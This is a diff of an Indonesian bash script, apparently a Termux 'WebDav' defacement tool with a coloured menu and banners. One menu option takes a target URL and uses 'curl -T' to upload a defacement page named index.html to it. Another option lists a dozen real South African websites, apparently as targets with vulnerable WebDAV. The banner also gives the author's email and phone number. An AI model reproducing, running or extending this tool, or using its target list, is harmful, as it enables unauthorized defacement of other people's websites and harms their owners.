@@ -20,59 +20,26 @@ nc="\e[0m"
 red='\e[1;31m'
 yellow='\e[1;33m'
 clear
-#menu
-function menu(){
-    echo -e $Fiuscha "Selamat menggunakan Tools Ini >_<"
-    sleep 0.25
-    echo -e $purple "Silahkan Pilih Daftar List Nya"
-    sleep 0.25
-    echo -e $green "[1.Webdav] $blue [2.Web Vuln Webdav]"
-    echo -e $red "[3.exit]"
-    read TOD 
-    case $TOD in 
-    ("1")
-    sleep 1
-    Webdav
-    ("2")
-    sleep 1
-    webvuln
-    ("3")
-    echo -e "Thanks you mathefakah "
+#load  
+function load(){
+clear
+echo -e $red "MENGHUBUNGKAN..."
+sleep 0.25
+clear
+echo -e $blue "MENGHUBUNGKAN..."
+sleep 0.25
+clear
+echo -e $red "MENGHUBUNGKAN..."
+sleep 0.25
+clear
+echo -e $blue "MENGHUBUNGKAN..."
+sleep 0.25
+clear
+echo -e $red "MENGHUBUNGKAN..."
+sleep 0.25 
+clear       
 }
-function Webdav(){
-    echo -e "NOTE: Letakan Script Deface Di Luar Folder"
-    sleep 0.25
-    echo -e "Masukkan Target Webdav"
-    sleep 0.25
-    read "[root@target]>" target
-    echo "menunggu..."
-    sleep 1
-    echo -e "NOTE: File Harus Bernama index.html"
-    echo -e "Masukan Script Deface/file"
-    read "[root@file]>" file
-    sleep 1
-    clear
-    echo -e "Menghubungkan..."
- curl -T /storage/emulated/0/index.html $target
-}
-function mulai (){
-    echo "Melanjutkan Untuk Memilih"
-    echo "y/n?"
-    echo
-    read lagi
-    if [ $lagi = "y" ]; then
-            menu
-    else
-            echo "Bye Script Kiddies..."
-    fi
-#install
-function Install(){
-    pkg install ruby
-    gem install lolcat
-    pkg install curl
-    echo -e $blue "selamat Tools Terinstal"
-}
-#Banner
+ #Banner 2
 function Banner(){
      sleep 0.25                          
  echo -e $red " _ _ _     _     _"         
@@ -128,31 +95,126 @@ function Banner(){
             echo -e "|__/|__/\___/_.___/\__,_/\__,_/ |___/ " | lolcat
             sleep 0.25
 }
-install
-clear
-Banner
-echo ""
-echo -e $red "|<=+++++++++++++++=+++++++++++++++=>|"
-sleep 1
-echo -e $blue "+_+                       $purple +_+"
-sleep 0.21
-echo -e $red "+ AUTHOR : Hadi Prasetia            +"
-sleep 0.21 
-echo -e $blue "+_+                       $purple +_+"
-sleep 0.21
-echo -e $red "+ KONTAK : tampanskyyt@gmail.com    +"
-sleep 0.21
-echo -e $blue "+_+                       $purple +_+"
-sleep 0.21
-echo -e $red "+ Team : Red Eye Cyber Team         +"
-sleep 0.21
-echo -e $blue "+_+                       $purple +_+"
-sleep 0.21
-echo -e $red "+ SUPPORT By Assyfamawarni          +"
-sleep 0.21
-echo -e $blue "+_+                       $purple +_+"
+load
 sleep 0.25
-echo -e $red "|<=+++++++++++++++=+++++++++++++++=>|"
+echo ""
+echo -e $red "_____$blue_____$red_____$blue_____"
+sleep 0.25
+echo -e $lightgreen "Author : $lightcyan HadiPrasetia"
+sleep 0.25
+echo -e $red "Email : $blue Tampanskyyt@gmail.com"
+sleep 0.25
+echo -e $lightgreen "Nomor Whatsapp : $lightcyan 087887986528"
+sleep 0.25
+echo -e $red "Thanks To $blue Suport Me "
+sleep 0.25
+echo -e $lightgreen "Tools WebDav Terbaru."
+sleep 0.25
+echo -e $red "_____$blue_____$red_____$blue_____"
+sleep 0.25
+echo ""
+echo -e "_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_" | lolcat
+echo -e $blue "     [Pilih Menu.]"
+echo -e $okegreen "[1.WebDav] | [2.WeBvuln]"
+echo -e $red "   [3.Exit]"
+echo -e "_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_" | lolcat
+read "root@./tampansky:~#" Pilih
+case $Pilih in
+("1")
+ load
+ sleep 1
+ Banner
+ echo -e "NOTE : TARUH FILE DEFACE KALIAN DI LUAR FOLDER"
+ echo -e "NOTE : FILE HARUS BERNAMA INDEX.html"
+ read $nc "[FIle} :" file #membaca file
+ echo ""
+ clear
+ echo -e "NOTE : Silahkan Masukan Target"
+ read "[Target} :" target #membaca target
+ echo ""
+clear 
+ load 
+ curl -T /storage/emulated/0/$file $target
+ ;;
+("2")
+load 
 sleep 1
-mulai
-case
+Banner
+echo -e $red "[http://bitsandpieces.co.za]"
+sleep 0.25
+echo -e $yellow "[http://cblandscapes.co.za]"
+sleep 0.25
+echo -e $green "[http://windmillsandporcupines.co.za"
+sleep 0.25
+echo -e $blue "[http://scnc.co.za]"
+sleep 0.25
+echo -e $red "[http://contsol.co.za]"
+sleep 0.25
+echo -e $yellow "[http://consultec.co.za]"
+sleep 0.25
+echo -e $green "[http://colourfactory.co.za]"
+sleep 0.25
+echo -e $blue "[http://ayk.co.za]"
+sleep 0.25
+echo -e $red "[http://daretogowildafrica.co.za]"
+sleep 0.25
+echo -e $yellow "[http://floralandfresh.co.za]"
+sleep 0.25
+echo -e $green "[http://foodconsult.co.za]"
+sleep 0.25
+echo -e $blue "[http://itsengineering.co.za]"
+sleep 0.25
+;;
+("3")
+load 
+sleep 2
+echo -e $red "           _ _   "
+echo -e $red "  _____  _(_) |_ "
+echo -e $red " / _ \ \/ / | __|"
+echo -e $red "|  __/>  <| | |_ "
+echo -e $red " \___/_/\_\_|\__|"
+sleep 0.25
+echo -e $blue "           _ _   "
+echo -e $blue "  _____  _(_) |_ "
+echo -e $blue " / _ \ \/ / | __|"
+echo -e $blue "|  __/>  <| | |_ "
+echo -e $blue " \___/_/\_\_|\__|"  
+sleep 0.25       
+echo -e $red "           _ _   "
+echo -e $red "  _____  _(_) |_ "
+echo -e $red " / _ \ \/ / | __|"
+echo -e $red "|  __/>  <| | |_ "
+echo -e $red " \___/_/\_\_|\__|"
+sleep 0.25
+echo -e $blue "           _ _   "
+echo -e $blue "  _____  _(_) |_ "
+echo -e $blue " / _ \ \/ / | __|"
+echo -e $blue "|  __/>  <| | |_ "
+echo -e $blue " \___/_/\_\_|\__|"  
+sleep 0.25       
+echo -e $red "           _ _   "
+echo -e $red "  _____  _(_) |_ "
+echo -e $red " / _ \ \/ / | __|"
+echo -e $red "|  __/>  <| | |_ "
+echo -e $red " \___/_/\_\_|\__|"
+sleep 0.25
+echo -e $blue "           _ _   "
+echo -e $blue "  _____  _(_) |_ "
+echo -e $blue " / _ \ \/ / | __|"
+echo -e $blue "|  __/>  <| | |_ "
+echo -e $blue " \___/_/\_\_|\__|"  
+sleep 0.25       
+echo -e $red "           _ _   "
+echo -e $red "  _____  _(_) |_ "
+echo -e $red " / _ \ \/ / | __|"
+echo -e $red "|  __/>  <| | |_ "
+echo -e $red " \___/_/\_\_|\__|"
+sleep 0.25
+echo -e $blue "           _ _   "
+echo -e $blue "  _____  _(_) |_ "
+echo -e $blue " / _ \ \/ / | __|"
+echo -e $blue "|  __/>  <| | |_ "
+echo -e $blue " \___/_/\_\_|\__|"  
+sleep 0.25       
+;;
+esac
